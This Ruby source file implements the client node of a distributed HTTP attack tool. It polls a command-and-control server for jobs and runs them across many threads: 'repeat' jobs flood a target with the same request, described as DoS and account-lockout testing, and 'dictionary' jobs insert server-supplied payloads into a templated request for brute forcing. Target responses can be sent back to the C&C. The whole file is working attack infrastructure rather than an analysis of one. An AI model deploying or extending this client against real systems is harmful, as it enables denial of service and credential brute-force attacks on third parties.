# encoding: utf-8
class Client
	def initialize(server, thread_count, proxy_host, proxy_port)
		@server = server + "/api"
		@proxy_host = proxy_host
		@proxy_port = proxy_port
		@has_job = false
		@thread_count = thread_count

		@job_id = 0
		@job_type = ""
		@http_method = ""
		@http_uri = ""
		@http_host = ""
		@http_headers = ""
		@http_data_string = ""
		@http_data = ""
		@node_id = mac_address

		@attack_mode = ""
		@last_status_code = 0


		# This var is only used when performing dictionary attacks
		# It will be populated by the server
		@attack_payloads = []

	end

	def invoke
		# Make sure we can reach C&C
		cc_stability_test

		puts "(+) Polling for Job..."
		while @has_job == false
			# Poll
			job = request_job
			
			@has_job = true if job
		end

		@job_id 					= job["id"]
		@job_type					= job["attack_type"]
		@http_method 			= job["http_method"]
		@http_uri 				= job["http_uri"]
		@http_host 				= job["http_host"]
		@attack_mode 			= job["attack_mode"]
		@http_headers 		= parse_headers(Base64.decode64(job["http_headers"]))
		@http_data_string = Base64.decode64(job["http_data"])
		@http_data_string.force_encoding 'utf-8'
		@http_data 				= parse_data(Base64.decode64(job["http_data"]))

		@attack_payloads 	= parse_work(job["work"])


		puts "Payloads recvd: #{@attack_payloads}"

		kick_off_job!
	end

	def request_job
		endpoint = @server + "/poll/#{@node_id}"

		response = Mechanize.new.get(endpoint)
		# Parse response
		response_parsed = JSON.parse(response.body)
		
		if response_parsed["status"] == "active"
			return response_parsed
		else
			# Failed, but let's sleep
			random_sleep_time = random_polling_interval
			puts "Sleeping for #{random_sleep_time} seconds"
			sleep(random_sleep_time)
			return false
		end
	end

	def kick_off_job!
		puts "(+) Job recieved. Kicking it off with #{@thread_count} threads"
		puts "(+) Currently attacking: #{@http_uri}"
		monitor_thread_id = @thread_count + 1

		job_threads = (1..monitor_thread_id).map do |i|
			Thread.new(i) do |i|
				if i == monitor_thread_id
					while @has_job
						monitor_job_status
					end
				else
					while @has_job
						# Ideally we would check if process_request returns done
						# If it does, let the C&C know...
						process_request
					end
				end
			end
		end

		job_threads.each {|t| t.join }

		puts "(+) Job has been stopped by C&C"
		puts "(+) Beginning search for new job"
		invoke
	end

	#
	# This function handles the proper dispatching of request types
	#
	# Following is a list of request types and their specification.
	#
	# repeat:
	# => Simply put, repeat will continuously send the provided request
	# => over and over until the C&C tells it to stop. This is a useful
	# => DoS testing functionality. It may also be useful for testing
	# => account lockout.
	#
	# dictionary:
	# => Dictionary attacks will leverage a provided dictionary file,
	# => distributing work across currently connected nodes in batches.
	# 
	def process_request()
		# Check job type.. if repeat, just send request as is

		if @job_type == "repeat"
			send_request
		elsif @job_type == "dictionary"
			payload = @attack_payloads.pop

			if payload.nil?
				# No more work to do..mark job as complete
				@has_job = false
				return "done"
			end

			attack_uri = @http_uri.gsub("§", payload)

			attack_data = parse_data(@http_data_string.gsub("§", payload))
			# TODO: Implement header injection
			send_request(attack_uri, attack_data, @http_headers)
		end
	end

	# 
	# Process the HTTP data and ship that off to the client.
	# 
	# Currently this does not store any responses
	#
	def send_request(http_uri=nil,http_data=nil, http_headers=nil)
		req = Mechanize.new.tap do |r|
			if @proxy_host
				r.set_proxy(@proxy_host, @proxy_port)
			end
		end

		# Set these if they weren't passed in...
		http_uri ||= @http_uri
		http_data ||= @http_data
		http_headers ||= @http_headers

		if @http_method.downcase == "get"
			begin
				response = req.get(http_uri)

				store_response(response) if @attack_mode == 'store'
				@last_status_code = response.code.to_i
			rescue
				puts "Unable to connect with get."
			end
		else
			begin
				response = req.post(http_uri, http_data, http_headers)

				store_response(response) if @attack_mode == 'store'
				@last_status_code = response.code.to_i
			rescue
				puts "Unable to connect with post."
			end
		end
	end

	def store_response(response)
		endpoint = "#{@server}/job/#{@job_id}/saveResponse"

		data = { 
			:response 				=> Base64.encode64(response.body),
			:response_code 		=> response.code.to_i
		}
		begin
			Mechanize.new.post(endpoint, data)
		rescue
			# hmm
		end
	end

	# Communicates with C&C behind the scenes to look for job status changes

	def monitor_job_status
		# Let's sleep for a bit first
		random_sleep_time = random_polling_interval / 3
		sleep(random_sleep_time)

		# check status code
		status_code = @last_status_code

		puts "Checking job status for job #{@job_id} on node #{@node_id}"

		# Todo: Refactor this to also send the most previous http status code
		endpoint = "#{@server}/checkin/#{@node_id}/#{@job_id}/#{status_code}"

		begin
			response = Mechanize.new.get(endpoint)
			# Parse response
			response_parsed = JSON.parse(response.body)
			
			if response_parsed["status"] == "active"
				return response_parsed
			else
				@has_job = false
				return false
			end
		rescue
			# Ehh, let it slide for now.
			# Eventually there should be an error counter that kills
			# jobs based on a certain number of unsuccessful attempts
		end
	end

	def cc_stability_test
		req = Mechanize.new.tap do |r|
			if @proxy_host
				r.set_proxy(@proxy_host, @proxy_port)
			end
		end

		response = req.head(@server + "/health")

		if response.code.to_i >= 400
			puts "(!) Unable to communicate with command and control server"
			puts "(!) Please confirm address: #{@server}"
			exit
		end
	end

	# Generate a random integer between 13 and 77.
	# Used to control polling frequency
	def random_polling_interval
		13 + rand(64)
	end

	def parse_work(work)
		return [] if work.nil?

		return work.split("\n")
	end

	# Split data by & and =, returning hash
	def parse_data(data)
		begin
			return URI.decode_www_form(data)
		rescue
			return {}
		end
	end

	def parse_headers(headers)
		header_hash = {}

		lines = headers.split("\n")

		# IF there's only one line, return it
		return lines[0] if lines.count < 2

		lines.each do |line|
			split_line = line.split(":", 2)
			h = Hash[*split_line]
			header_hash.merge!(h)
		end

		return header_hash
	end

	def mac_address
	  platform = RUBY_PLATFORM.downcase
	  output = `#{(platform =~ /win32/) ? 'ipconfig /all' : 'ifconfig'}`
	  case platform
	    when /darwin/
	      $1 if output =~ /en1.*?(([A-F0-9]{2}:){5}[A-F0-9]{2})/im
	    when /win32/
	      $1 if output =~ /Physical Address.*?(([A-F0-9]{2}-){5}[A-F0-9]{2})/im
	    # Cases for other platforms...
	    else nil
	  end
	end
end